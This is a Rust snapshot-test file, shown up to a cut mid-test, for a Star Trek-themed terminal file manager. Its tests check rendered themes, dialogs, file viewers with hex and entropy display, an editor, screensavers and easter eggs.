use std::{
    env,
    path::PathBuf,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use anyhow::{Context, Result};
use borg_core::{CaptureProgress, Keep, Motion, Msg, Preferences, Settings};
use borg_term::GridSize;
use borg_testkit::{Snapshot, Stage, describe};
use borg_vfs::{Entry, EntryKind};
use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use ratatui::buffer::Buffer;

const CLOCK: &str = "2026-01-15T12:00:00+00:00[UTC]";
/// Away from the turn of a minute, when the clock screensaver's digits are calm.
const MIDMINUTE: &str = "2026-01-15T12:00:30.2+00:00[UTC]";
const PARTICLES_AT_REST: Duration = Duration::from_secs(1);
const PARTICLES_ADRIFT: Duration = Duration::from_secs(10);
const THESEUS_REFITTING: Duration = Duration::from_secs(24);
const THESEUS_REFITTED: Duration = Duration::from_secs(50);
const RECENT: u64 = 1_768_037_400;
const OLD: u64 = 1_717_200_000;
const SIZE: GridSize = GridSize { cols: 90, rows: 22 };
const NARROW: GridSize = GridSize { cols: 44, rows: 12 };
const WIDE: GridSize = GridSize { cols: 150, rows: 12 };
const ENV_SCREENSHOTS: &str = "BORG_SCREENSHOTS";
const SCREENSHOT_DIR: &str = "ui";
const HOME: &str = "/home/me";
const QUIET: Preferences = Preferences::DEFAULT;
const RELEASES: usize = 40;
/// Alerts in a new log beside one Borg kept aside.
const KEPT_ASIDE_ALERTS: usize = 2;

fn at(secs: u64) -> Option<SystemTime> {
    Some(UNIX_EPOCH + Duration::from_secs(secs))
}

fn entry(name: &str, kind: EntryKind, size: u64, modified: u64, executable: bool) -> Entry {
    Entry {
        source: None,
        missing: false,
        usage: None,
        name: name.into(),
        kind,
        size,
        modified: at(modified),
        executable,
        permissions: 0o644,
    }
}

fn project() -> Vec<Entry> {
    vec![
        entry("src", EntryKind::Dir, 4096, RECENT, false),
        entry("docs", EntryKind::Dir, 4096, OLD, false),
        entry("target", EntryKind::Symlink { to_dir: true }, 12, RECENT, false),
        entry("Cargo.toml", EntryKind::File, 1_234, RECENT, false),
        entry("README.md", EntryKind::File, 48_213, OLD, false),
        entry("build.sh", EntryKind::File, 310, RECENT, true),
        entry("latest.log", EntryKind::Symlink { to_dir: false }, 9, RECENT, false),
        entry("日本語メモ.txt", EntryKind::File, 2_048, RECENT, false),
        entry("socket", EntryKind::Other, 0, OLD, false),
        entry(".env", EntryKind::File, 64, RECENT, false),
    ]
}

fn logs() -> Vec<Entry> {
    vec![
        entry("journal", EntryKind::Dir, 4096, RECENT, false),
        entry("syslog", EntryKind::File, 2_411_724, RECENT, false),
        entry("kern.log", EntryKind::File, 734_003, RECENT, false),
        entry("auth.log", EntryKind::File, 88_100, OLD, false),
        entry("dmesg.0", EntryKind::File, 5_368_709_120, OLD, false),
    ]
}

fn crew() -> Vec<Entry> {
    ["one", "two", "three", "four", "five", "six", "seven", "eight", "nine"]
        .iter()
        .map(|name| entry(&format!("{name}.drone"), EntryKind::File, 1_000, RECENT, false))
        .collect()
}

fn staged(motion: Motion, preferences: Preferences, left: Vec<Entry>, clock: &str) -> Result<Stage> {
    let settings = Settings { motion, preferences, ..Settings::default() };
    let mut stage = Stage::new(
        [PathBuf::from("/home/me/projects/borg"), PathBuf::from("/var/log")],
        [left, logs()],
        SIZE,
        settings,
        clock.parse()?,
    )?;
    stage.home = Some(PathBuf::from(HOME));
    Ok(stage)
}

fn stage(size: GridSize, motion: Motion) -> Result<Stage> {
    let settings = Settings { motion, preferences: QUIET, ..Settings::default() };
    let mut stage = Stage::new(
        [PathBuf::from("/home/me/projects/borg"), PathBuf::from("/var/log")],
        [project(), logs()],
        size,
        settings,
        CLOCK.parse()?,
    )?;
    stage.home = Some(PathBuf::from(HOME));
    Ok(stage)
}

fn chars(c: &str) -> impl Iterator<Item = Msg> + '_ {
    c.chars().map(|c| key(KeyCode::Char(c)))
}

fn key(code: KeyCode) -> Msg {
    Msg::Key(KeyEvent::new(code, KeyModifiers::NONE))
}

fn ctrl(c: char) -> Msg {
    Msg::Key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::CONTROL))
}

fn check(name: &str, stage: &Stage, buffer: Buffer) -> Result<()> {
    check_with(name, stage, buffer, Vec::new())
}

fn check_with(name: &str, stage: &Stage, buffer: Buffer, placements: Vec<borg_gfx::Placement>) -> Result<()> {
    if let Some(dir) = env::var_os(ENV_SCREENSHOTS) {
        let path = PathBuf::from(dir).join(SCREENSHOT_DIR).join(name).with_extension("png");
        Snapshot::from_buffer(buffer.clone(), &stage.palette, None).with_placements(placements).save_png(&path)?;
    }
    insta::assert_snapshot!(name, describe(&buffer));
    Ok(())
}

#[test]
fn every_builtin_theme() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down));
    let ids: Vec<String> = stage.state.appearance.choices().iter().map(|t| t.id.clone()).collect();

    for (index, id) in ids.iter().enumerate() {
        stage.state.appearance.select(index, stage.started, Duration::ZERO);
        let buffer = stage.render(stage.started)?;
        check(&format!("theme_{id}"), &stage, buffer)?;
    }
    Ok(())
}

#[test]
fn theme_picker_overlay() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(key(KeyCode::F(9))).send(key(KeyCode::Down));
    let buffer = stage.render(stage.started)?;
    check("picker", &stage, buffer)
}

#[test]
fn shell_view_shows_terminal() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.shell(b"ls -1\r\n\x1b[1;34msrc\x1b[0m\r\nCargo.toml\r\n\x1b]133;A\x07$ \x1b]133;B\x07");
    stage.send(ctrl('o'));
    let buffer = stage.render(stage.started)?;
    check("shell_view", &stage, buffer)
}

#[test]
fn shell_switch_is_immediate() -> Result<()> {
    let mut stage = stage(SIZE, Motion::LOCAL)?;
    stage.shell(b"echo hi\r\nhi\r\n\x1b]133;A\x07$ \x1b]133;B\x07");
    stage.send(ctrl('o'));
    let midpoint = stage.started + Motion::LOCAL.fade / 2;
    let buffer = stage.render(midpoint)?;
    check("shell_switch_immediate", &stage, buffer)
}

#[test]
fn command_menu_open() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    let index = borg_core::menus(&stage.state).iter().position(|menu| menu.title == "Command").unwrap();
    stage.send(Msg::Pointer(borg_core::Pointer::Menu(index)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Same folder in other panel")?;
    check("command_menu", &stage, buffer)
}

#[test]
fn narrow_terminal_drops_columns() -> Result<()> {
    let mut stage = stage(NARROW, Motion::STILL)?;
    let buffer = stage.render(stage.started)?;
    check("narrow", &stage, buffer)
}

#[test]
fn brief_listing_with_marks() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE)));
    stage.send(key(KeyCode::Insert)).send(key(KeyCode::Down)).send(key(KeyCode::Insert));
    stage.state.panels[0].set_mode(borg_core::ListingMode::Brief);
    let buffer = stage.render(stage.started)?;
    check("brief_marked", &stage, buffer)
}

#[test]
fn file_menu_open() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
    stage.send(key(KeyCode::F(2)));
    let buffer = stage.render(stage.started)?;
    check("file_menu", &stage, buffer)
}

#[test]
fn copy_and_delete_dialogs() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
    stage.send(key(KeyCode::F(5)));
    let copy = stage.render(stage.started)?;
    check("copy_dialog", &stage, copy)?;

    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char(' ')));
    let buffered = stage.render(stage.started)?;
    check("copy_dialog_hard_drive", &stage, buffered)?;

    stage.send(key(KeyCode::Esc)).send(key(KeyCode::F(8)));
    let delete = stage.render(stage.started)?;
    check("delete_dialog", &stage, delete)
}

#[test]
fn copy_dialog_keeps_shortcuts_visible_in_a_narrow_terminal() -> Result<()> {
    let mut stage = stage(NARROW, Motion::STILL)?;
    stage.send(key(KeyCode::Down)).send(key(KeyCode::F(5)));
    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char(' ')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Tab · Space check · Enter · Esc")?;
    check("copy_dialog_hard_drive_narrow", &stage, buffer)
}

#[test]
fn viewer_wraps_and_unwraps() -> Result<()> {
    use std::sync::Arc;

    let mut stage = stage(SIZE, Motion::STILL)?;
    let text: String = (1..=40)
        .map(|i| if i == 3 { format!("{i:>3} {}\n", "long ".repeat(30)) } else { format!("{i:>3} log line\n") })
        .collect();
    let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
    let pager = borg_view::Pager::new(Arc::new(text.into_bytes()), width, height)?;
    opened(&mut stage, borg_core::Viewer::new(PathBuf::from("/var/log/app.log"), borg_core::Content::Text(pager)));
    let wrapped = stage.render(stage.started)?;
    check("viewer_wrapped", &stage, wrapped)?;

    stage.send(key(KeyCode::Char('w'))).send(key(KeyCode::Right));
    let unwrapped = stage.render(stage.started)?;
    check("viewer_unwrapped", &stage, unwrapped)
}

/// Sends `msg`, running a search the viewer asks for as the app does.
fn send_and_search(stage: &mut Stage, msg: Msg) {
    for effect in borg_core::update(&mut stage.state, msg, stage.started) {
        let borg_core::Effect::FindInViewer { id, query, from, direction, count } = effect else { continue };
        let Some(borg_core::Content::Text(pager)) = stage.state.viewer.as_ref().map(|viewer| &viewer.content) else {
            continue;
        };
        let found = borg_core::find_in(&*pager.source(), &query, from, direction, count, &|_| true);
        stage.send(Msg::FoundInViewer { id, found: found.map_err(|error| error.to_string()) });
    }
}

#[test]
fn viewer_marks_matches_and_steps_through_them() -> Result<()> {
    use std::sync::Arc;

    let mut stage = stage(SIZE, Motion::STILL)?;
    let text: String =
        (1..=60).map(|i| format!("{i:>3} GET /api/items/{} took {} ms\n", i * 37 % 100, i * 7 % 50)).collect();
    let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
    let pager = borg_view::Pager::new(Arc::new(text.into_bytes()), width, height)?;
    opened(&mut stage, borg_core::Viewer::new(PathBuf::from("/var/log/api.log"), borg_core::Content::Text(pager)));
    stage.send(key(KeyCode::F(7)));
    for msg in chars("took 4") {
        send_and_search(&mut stage, msg);
    }
    send_and_search(&mut stage, key(KeyCode::Enter));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "2 of 13")?;
    check("viewer_find", &stage, buffer)?;
    send_and_search(&mut stage, key(KeyCode::Esc));
    send_and_search(&mut stage, key(KeyCode::Char('n')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "3 of 13 · n next · N previous")?;
    check("viewer_find_closed", &stage, buffer)
}

/// A small made-up binary: a header, zeros, a table of offsets and the text of its help.
fn binary_sample() -> Vec<u8> {
    let mut bytes = b"BORGIMG\0\x01\x02\x00\x00\x10\x00\x00\x00".to_vec();
    bytes.extend([0; 40]);
    bytes.extend((0..24u8).flat_map(|i| [i.wrapping_mul(37), 0x80 | i, 0, 0]));
    bytes.extend(b"usage: tool [--verbose] <file>\n\tprints the image's header\n");
    bytes.extend((0..=255u8).rev());
    bytes
}

#[test]
fn viewer_shows_hex_rows_that_fit_the_width_and_marks_matches_in_both_columns() -> Result<()> {
    use std::sync::Arc;

    for (size, name) in [(SIZE, "viewer_hex"), (NARROW, "viewer_hex_narrow"), (WIDE, "viewer_hex_wide")] {
        let mut stage = stage(size, Motion::STILL)?;
        let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
        let pager = borg_view::Pager::new(Arc::new(binary_sample()), width, height)?;
        opened(
            &mut stage,
            borg_core::Viewer::new(PathBuf::from("/opt/tool/image.bin"), borg_core::Content::Text(pager)),
        );
        stage.send(key(KeyCode::Char('h')));
        let buffer = stage.render(stage.started)?;
        ensure_text(&buffer, "0000  42 4f 52 47")?;
        check(name, &stage, buffer)?;
    }

    let mut stage = stage(SIZE, Motion::STILL)?;
    let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
    let pager = borg_view::Pager::new(Arc::new(binary_sample()), width, height)?;
    opened(&mut stage, borg_core::Viewer::new(PathBuf::from("/opt/tool/image.bin"), borg_core::Content::Text(pager)));
    stage.send(key(KeyCode::Char('h'))).send(key(KeyCode::F(7)));
    for msg in chars("verbose") {
        send_and_search(&mut stage, msg);
    }
    send_and_search(&mut stage, key(KeyCode::Esc));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1 of 1 · n next · N previous")?;
    check("viewer_hex_find", &stage, buffer)
}

/// Sends `msg`, reading the entropy the viewer asks for as the app does.
fn send_and_profile(stage: &mut Stage, msg: Msg) {
    for effect in borg_core::update(&mut stage.state, msg, stage.started) {
        let borg_core::Effect::ProfileViewer { id } = effect else { continue };
        let Some(borg_core::Content::Text(pager)) = stage.state.viewer.as_ref().map(|viewer| &viewer.content) else {
            continue;
        };
        let profile = borg_view::entropy::Profile::read(&*pager.source(), &|| true).map_err(|e| e.to_string());
        let profile = profile.and_then(|profile| profile.ok_or_else(|| "stopped".to_owned()));
        stage.send(Msg::ViewerProfiled { id, profile });
    }
}

/// A made-up packed program, a few 4 KiB blocks of each part: a header, code, zeros, a
/// compressed payload and the text of its help.
fn packed_sample() -> Vec<u8> {
    let block = borg_view::entropy::BLOCK as usize;
    let mut noise = 0x2545_f491_4f6c_dd1du64;
    let mut random = move || {
        noise ^= noise << 13;
        noise ^= noise >> 7;
        noise ^= noise << 17;
        noise as u8
    };
    let opcodes: Vec<u8> = (0x40..0x58).collect();
    let mut bytes = b"BORGPAK\0\x01\x02\x00\x00\x10\x00\x00\x00".to_vec();
    bytes.resize(block, 0);
    bytes.extend((0..4 * block).map(|_| opcodes[usize::from(random()) % opcodes.len()]));
    bytes.extend(vec![0; 2 * block]);
    bytes.extend((0..6 * block).map(|_| random()));
    bytes.extend(b"usage: tool [--verbose] <file>\n".iter().cycle().take(3 * block));
    bytes
}

#[test]
fn viewer_hex_rows_show_the_files_entropy_beside_them() -> Result<()> {
    use std::sync::Arc;

    let mut stage = stage(SIZE, Motion::STILL)?;
    let path = PathBuf::from("/opt/tool/tool.pak");
    let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
    let pager = borg_view::Pager::for_path(Arc::new(packed_sample()), &path, width, height)?;
    stage.state.opening = Some(path.clone());
    send_and_profile(&mut stage, Msg::Opened(borg_core::Viewer::new(path, borg_core::Content::Text(pager))));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "hex · entropy 0.03, low")?;
    check("viewer_hex_entropy", &stage, buffer)?;

    send_and_profile(&mut stage, key(KeyCode::Char(']')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "7000  ")?;
    ensure_text(&buffer, ", high")?;
    check("viewer_hex_entropy_high", &stage, buffer)?;

    let classic = stage.state.appearance.choices().iter().position(|c| c.id == "classic").unwrap();
    stage.state.appearance.select(classic, stage.started, Duration::ZERO);
    let buffer = stage.render(stage.started)?;
    check("viewer_hex_entropy_classic", &stage, buffer)?;

    let click = crossterm::event::MouseEvent {
        kind: crossterm::event::MouseEventKind::Down(crossterm::event::MouseButton::Left),
        column: SIZE.cols - 1,
        row: SIZE.rows - 4,
        modifiers: crossterm::event::KeyModifiers::NONE,
    };
    let msg = borg_ui::mouse_input(&stage.state, click, false, stage.started);
    anyhow::ensure!(
        matches!(msg, Some(Msg::Pointer(borg_core::Pointer::EntropyStrip { cell: 18, cells: 21 }))),
        "{msg:?}"
    );
    stage.send(msg.unwrap());
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "db60  ")?;
    for (cols, rows) in [(0, 0), (1, 1), (12, 6), (44, 14)] {
        stage.send(Msg::Resize { cols, rows });
        stage.render(stage.started)?;
    }
    Ok(())
}

#[test]
fn viewer_lays_out_json_written_on_one_line() -> Result<()> {
    use std::sync::Arc;

    let mut stage = stage(SIZE, Motion::STILL)?;
    let json = r#"{"service":"api","port":8080,"tls":{"enabled":true,"cert":"/etc/api/cert.pem"},"routes":[{"path":"/items","methods":["GET","POST"]},{"path":"/health","methods":[]}],"retries":3,"timeout":2.5,"owner":null}"#;
    let path = PathBuf::from("/srv/api/config.json");
    let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
    let pager = borg_view::Pager::for_path(Arc::new(json.as_bytes().to_vec()), &path, width, height)?;
    opened(&mut stage, borg_core::Viewer::new(path, borg_core::Content::Text(pager)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "s source/pretty")?;
    ensure_text(&buffer, r#"      "methods": ["#)?;
    check("viewer_json", &stage, buffer)
}

#[test]
fn widened_left_panel() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    let widen = KeyEvent::new(KeyCode::Right, KeyModifiers::ALT | KeyModifiers::SHIFT);
    (0..6).for_each(|_| {
        stage.send(Msg::Key(widen));
    });
    let buffer = stage.render(stage.started)?;
    check("widened", &stage, buffer)
}

#[test]
fn about_screen_and_cube_unlock() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(key(KeyCode::F(1)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Resistance is futile.")?;
    check("about", &stage, buffer)?;

    chars("borg").for_each(|msg| {
        stage.send(msg);
    });
    let unlocked = stage.state.appearance.choices().iter().any(|choice| choice.id == "cube");
    anyhow::ensure!(unlocked, "typing borg in About must unlock the cube theme");
    let cube = stage.state.appearance.choices().len() - 1;
    stage.send(key(KeyCode::Esc));
    stage.state.appearance.select(cube, stage.started, Duration::ZERO);
    let buffer = stage.render(stage.started)?;
    check("theme_cube", &stage, buffer)
}

#[test]
fn konami_code_starts_glyph_rain() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(key(KeyCode::F(1)));
    [
        KeyCode::Up,
        KeyCode::Up,
        KeyCode::Down,
        KeyCode::Down,
        KeyCode::Left,
        KeyCode::Right,
        KeyCode::Left,
        KeyCode::Right,
    ]
    .into_iter()
    .map(key)
    .chain(chars("ba"))
    .for_each(|msg| {
        stage.send(msg);
    });
    anyhow::ensure!(stage.state.raining(stage.started), "konami must start the rain");
    let buffer = stage.render(stage.started + Duration::from_millis(1500))?;
    check("about_rain", &stage, buffer)
}

#[test]
fn startup_intro_glitches_settles_and_gives_way_to_any_key() -> Result<()> {
    let mut stage = stage(SIZE, Motion::LOCAL)?;
    stage.state.intro = Some(stage.started);
    let buffer = stage.render(stage.started + Duration::from_millis(120))?;
    check("intro_glitch", &stage, buffer)?;
    let settled =
        Snapshot::from_buffer(stage.render(stage.started + Duration::from_millis(1000))?, &stage.palette, None);
    anyhow::ensure!(settled.contains("██████  ██    ██ ██████  ██   ███"), "the logo settles:\n{}", settled.text());
    stage.send(key(KeyCode::Down));
    anyhow::ensure!(stage.state.intro.is_none(), "a key dismisses the intro");
    anyhow::ensure!(stage.state.active_panel().cursor() == 1, "and still reaches the panels");
    stage.state.intro = Some(stage.started);
    stage.state.settings.preferences.screensaver = true;
    stage.state.settings.screensaver_after = Duration::from_secs(1);
    let ended = stage.started + borg_core::INTRO;
    borg_core::update(&mut stage.state, Msg::Tick, ended);
    anyhow::ensure!(stage.state.intro.is_none(), "the intro ends on its own");
    anyhow::ensure!(!stage.state.screensaver, "the screensaver does not replace the intro");
    borg_core::update(&mut stage.state, Msg::Tick, ended + Duration::from_millis(900));
    anyhow::ensure!(!stage.state.screensaver, "idle time counts from when the panels appear");
    borg_core::update(&mut stage.state, Msg::Tick, ended + Duration::from_secs(1));
    anyhow::ensure!(stage.state.screensaver, "and the screensaver follows after the idle period");
    Ok(())
}

#[test]
fn screensaver_after_idle() -> Result<()> {
    let preferences = Preferences { screensaver: true, ..QUIET };
    let mut stage = staged(Motion::LOCAL, preferences, project(), CLOCK)?;
    stage.state.settings.screensaver_after = Duration::from_secs(5);
    let later = stage.started + Duration::from_secs(6);
    borg_core::update(&mut stage.state, Msg::Tick, later);
    anyhow::ensure!(stage.state.screensaver, "screensaver must start after the idle period");
    let buffer = stage.render(later)?;
    check("screensaver", &stage, buffer)?;
    stage.state.saver = borg_core::Saver::Glitch;
    let calm = Snapshot::from_buffer(stage.render(later)?, &stage.palette, None);
    anyhow::ensure!(calm.contains("c o m m a n d e r"), "the glitch screensaver shows the logo");
    let burst = (0..120)
        .map(|tenth| later + Duration::from_millis(100 * tenth))
        .find(|&at| {
            let shot = Snapshot::from_buffer(stage.render(at).unwrap(), &stage.palette, None);
            shot.text().chars().filter(|c| matches!(c, '▓' | '▒' | '░')).count() >= 40
        })
        .ok_or_else(|| anyhow::anyhow!("the glitch screensaver must burst within 12 seconds"))?;
    let buffer = stage.render(burst)?;
    check("screensaver_glitch", &stage, buffer)?;

    stage.state.saver = borg_core::Saver::Clock;
    stage.clock = MIDMINUTE.parse()?;
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "2026-01-15")?;
    check("screensaver_clock", &stage, buffer)?;

    stage.state.saver = borg_core::Saver::Particles;
    let rest = Snapshot::from_buffer(stage.render(later + PARTICLES_AT_REST)?, &stage.palette, None);
    anyhow::ensure!(rest.contains("c o m m a n d e r"), "the particles start as the logo");
    let buffer = stage.render(later + PARTICLES_ADRIFT)?;
    check("screensaver_particles", &stage, buffer)?;

    stage.state.saver = borg_core::Saver::Theseus;
    let buffer = stage.render(later + THESEUS_REFITTING)?;
    check("screensaver_theseus", &stage, buffer)?;
    let buffer = stage.render(later + THESEUS_REFITTED)?;
    check("screensaver_theseus_refitted", &stage, buffer)?;

    borg_core::update(&mut stage.state, key(KeyCode::Char('x')), later);
    anyhow::ensure!(!stage.state.screensaver, "a key must wake the screensaver");
    Ok(())
}

#[test]
fn seven_of_nine_and_assimilation() -> Result<()> {
    let mut stage = staged(Motion::STILL, QUIET, crew(), CLOCK)?;
    stage.send(key(KeyCode::Down));
    (0..7).for_each(|_| {
        stage.send(key(KeyCode::Insert));
    });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Seven of Nine")?;
    check("seven_of_nine", &stage, buffer)?;

    stage.send(key(KeyCode::Insert)).send(key(KeyCode::Insert));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "all 9 assimilated")
}

#[test]
fn editor_shows_highlighted_code_numbers_selection_and_a_find_bar() -> Result<()> {
    let mut stage = staged(Motion::STILL, QUIET, Vec::new(), CLOCK)?;
    let text = "fn main() {\n\tlet name = \"Borg\";\n    println!(\"{name}\");\n}\n";
    let stamp = borg_core::FileStamp { len: text.len() as u64, modified: None, inode: 1 };
    let file = borg_core::EditorFile { path: "/home/me/projects/borg/src/main.rs".into(), text: text.into(), stamp };
    borg_core::update(&mut stage.state, Msg::EditorOpened(borg_core::EditorSlot::Screen, Ok(file)), stage.started);
    stage.send(key(KeyCode::Down)).send(Msg::Key(KeyEvent::new(KeyCode::End, KeyModifiers::SHIFT)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Ln 2, Col 20")?;
    check("editor", &stage, buffer)?;
    stage.send(ctrl('f')).send(ctrl('u'));
    chars("name").for_each(|msg| {
        stage.send(msg);
    });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1 of 2")?;
    check("editor_find", &stage, buffer)
}

#[test]
fn editor_takes_clicks_in_the_text_its_status_line_and_its_dialogs() -> Result<()> {
    use borg_core::Pointer;
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = staged(Motion::STILL, QUIET, Vec::new(), CLOCK)?;
    let text = "cat Cat\ncat dog\n";
    let stamp = borg_core::FileStamp { len: text.len() as u64, modified: None, inode: 1 };
    let file = borg_core::EditorFile { path: "/home/me/projects/borg/notes.txt".into(), text: text.into(), stamp };
    borg_core::update(&mut stage.state, Msg::EditorOpened(borg_core::EditorSlot::Screen, Ok(file)), stage.started);
    let click = |screen: &Snapshot, text: &str| {
        let (column, row) =
            screen.find(text).unwrap_or_else(|| panic!("{text} on screen\n{}", screen.lines().join("\n")));
        MouseEvent { kind: MouseEventKind::Down(MouseButton::Left), column, row, modifiers: KeyModifiers::NONE }
    };
    let hit = |stage: &Stage, event, double| borg_ui::mouse_input(&stage.state, event, double, stage.started);
    let screen = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
    let at_dog = click(&screen, "dog");
    let Some(Msg::Pointer(word @ Pointer::EditorClick { line: 1, column: 4, select: false, word: true, .. })) =
        hit(&stage, at_dog, true)
    else {
        panic!("a double click on dog selects it");
    };
    stage.send(Msg::Pointer(word));
    assert_eq!(stage.state.editor.as_ref().unwrap().buffer.selected_text().as_deref(), Some("dog"));
    let at_menu = MouseEvent { row: 0, ..at_dog };
    assert!(
        !matches!(hit(&stage, at_menu, false), Some(Msg::Pointer(Pointer::Menu(_)))),
        "the menu behind the editor takes no clicks"
    );

    let find = hit(&stage, click(&screen, "Ctrl-R Replace"), false).unwrap();
    assert!(matches!(find, Msg::Key(KeyEvent { code: KeyCode::Char('r'), modifiers: KeyModifiers::CONTROL, .. })));
    stage.send(find);
    stage.send(key(KeyCode::Tab));
    chars("bird").for_each(|msg| {
        stage.send(msg);
    });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Replace with")?;
    check("editor_replace", &stage, buffer.clone())?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let all = hit(&stage, click(&screen, "[ All ]"), false).unwrap();
    assert!(matches!(all, Msg::Pointer(Pointer::EditorControl(_, 3))));
    stage.send(all);
    let editor = stage.state.editor.as_ref().unwrap();
    assert_eq!(editor.buffer.text(), "cat Cat\ncat bird\n");
    assert!(editor.prompt.is_none(), "All closes the dialog");

    stage.send(key(KeyCode::Esc));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Save the changes to notes.txt?")?;
    check("editor_unsaved", &stage, buffer.clone())?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let discard = hit(&stage, click(&screen, "[ Discard ]"), false).unwrap();
    stage.send(discard);
    assert!(stage.state.editor.is_none(), "Discard closes the editor");
    Ok(())
}

#[test]
fn panels_hold_editors_side_by_side_and_the_key_bar_follows_the_focus() -> Result<()> {
    use borg_core::{EditorSlot, Pointer, Side};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = staged(Motion::STILL, QUIET, project(), CLOCK)?;
    let open = |stage: &mut Stage, side, path: &str, text: &str| {
        let stamp = borg_core::FileStamp { len: text.len() as u64, modified: None, inode: 1 };
        let file = borg_core::EditorFile { path: path.into(), text: text.into(), stamp };
        borg_core::update(&mut stage.state, Msg::EditorOpened(EditorSlot::Panel(side), Ok(file)), stage.started);
    };
    let main = "fn main() {\n    println!(\"Borg\");\n}\n";
    open(&mut stage, Side::Left, "/home/me/projects/borg/src/main.rs", main);
    open(&mut stage, Side::Right, "/home/me/projects/borg/Cargo.toml", "[package]\nname = \"borg\"\n");
    stage.send(key(KeyCode::Down)).send(Msg::Key(KeyEvent::new(KeyCode::End, KeyModifiers::SHIFT)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "F6Switch")?;
    ensure_text(&buffer, "Ctrl-C Copy")?;
    check("docked_editors", &stage, buffer.clone())?;

    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let at = |text: &str| {
        let (column, row) =
            screen.find(text).unwrap_or_else(|| panic!("{text} on screen\n{}", screen.lines().join("\n")));
        MouseEvent { kind: MouseEventKind::Down(MouseButton::Left), column, row, modifiers: KeyModifiers::NONE }
    };
    let hit = |stage: &Stage, event| borg_ui::mouse_input(&stage.state, event, false, stage.started);
    assert!(matches!(hit(&stage, at("F6Switch")), Some(Msg::Key(KeyEvent { code: KeyCode::F(6), .. }))));
    let Some(Msg::Pointer(click @ Pointer::EditorClick { slot: EditorSlot::Panel(Side::Left), line: 1, .. })) =
        hit(&stage, at("println"))
    else {
        panic!("a click in the left editor places its cursor");
    };
    stage.send(Msg::Pointer(click));
    assert_eq!(stage.state.active, Side::Left);

    // The Replace dialog takes the room its buttons need, past the panel's edge.
    stage.send(key(KeyCode::F(4)));
    let screen = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
    let (column, row) = screen.find("[ Close ]").unwrap_or_else(|| panic!("{}", screen.lines().join("\n")));
    let close =
        MouseEvent { kind: MouseEventKind::Down(MouseButton::Left), column, row, modifiers: KeyModifiers::NONE };
    let close = hit(&stage, close).unwrap();
    assert!(matches!(close, Msg::Pointer(Pointer::EditorControl(EditorSlot::Panel(Side::Left), _))));
    stage.send(close);
    assert!(stage.state.docked[0].as_ref().is_some_and(|editor| editor.prompt.is_none()), "Close closes the dialog");

    stage.send(key(KeyCode::Esc));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "F5Copy")?;
    ensure_text(&buffer, "Cargo.toml")?;
    assert!(stage.state.docked[0].is_none() && stage.state.docked[1].is_some());
    Ok(())
}

#[test]
fn empty_folders_flash_now_and_then_and_remember_patrick_stewart_on_october_28() -> Result<()> {
    let mut stage = staged(Motion::STILL, QUIET, Vec::new(), CLOCK)?;
    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
    ensure_text(&buffer, "empty")?;
    check("empty_folder", &stage, buffer)?;
    let flash = (0..600)
        .map(|step| step as f32 * 0.05)
        .find(|t| borg_core::empty_glitch(*t).is_some_and(|progress| progress < 0.2))
        .context("a flash within half a minute")?;
    let buffer = stage.render(stage.started + Duration::from_secs_f32(flash))?;
    check("empty_folder_flash", &stage, buffer)?;
    let mut stage = staged(Motion::STILL, QUIET, Vec::new(), "2026-10-28T12:00:00+00:00[UTC]")?;
